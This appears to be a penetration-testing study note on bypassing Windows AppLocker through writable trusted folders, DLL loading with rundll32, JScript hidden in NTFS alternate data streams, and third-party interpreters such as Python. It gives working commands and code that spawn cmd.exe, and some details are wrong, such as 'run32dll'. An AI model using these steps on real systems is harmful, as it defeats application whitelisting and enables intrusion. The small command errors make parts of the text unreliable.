**TRUSTED FOLDERS:**

AppLocker rules does not apply to the built-in local accounts such as Local System, Local Service, or Network Service. Neither they do apply to the IIS DefaultAppPool account.

Default AppLocker rules only allows to execute programs located under these directories: C:\Program Files, C:\Program Files (x86), and C:\Windows.

However there may be subdirectories under C:\Program Files, C:\Program Files (x86), or C:\Windows that may have write and executable permisions. To do so we will use [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
in conjuction with icacls:

```
1. accesschk.exe <user_name> C:\Windows -wus
2. icacls <directory>  -> on the posible directories to check if they got executable permision
```

**BYPASS WITH DLLs:**

The default ruleset doesn’t protect against loading arbitrary DLLs. So if we create an unmangaed DLL, we load it and then call methods of that unmanaged DLL, we could gain code execution:

```
1st Create an unmanaged DLL:
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)

{
  switch (ul_reason_for_call)
  {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
  MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}

2nd Compile the DLL

3rd Load and execute the run method of the DLL

C:\> run32dll testdll.dll,run
```

**ALTERNATE DATA STREAMS:**

Windows Filesystem is based on NTFS and NTFS supports multiple Data Streams. An Alternate Data Stream is a binary file attribute that contains metadata.

For example lets say we have this JScript file(test.js) with this contents:

```
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```

Then we use this command to write test.js as an Alternate Data Stream of a file that is located under a whitelisted directory, and we have write permissions over it.

```
C:\> type test.js > "C:\Program Files(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

C:\> dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"
  Volume in drive C has no label.
  Volume Serial Number is 305C-7C84

Directory of C:\Program Files (x86)\TeamViewer

03/09/2020 08:34 AM 32,489 TeamViewer12_Logfile.log
                      79 TeamViewer12_Logfile.log:test.js:$DATA

          1 File(s) 32,489 bytes
          0 Dir(s) 696,483,840 bytes free

C:> wscript.exe "C:\Program Files(x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"   -> this will spawn a cmd.exe
```

**THIRD PARTY EXECUTION:**

AppLocker only enforces rules against native Windows executable data file types. However if another scripting interpreter is installed on the system(as python) we can abuse that. See the python [shellcode runner](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/Application%20WhiteListing/shellcode_runner_x64.py).

You can also use Java to bypass AppLocker, however this requires JRE to be installed. Additionally AppLocker doesn't block the execution of Office macros.
 
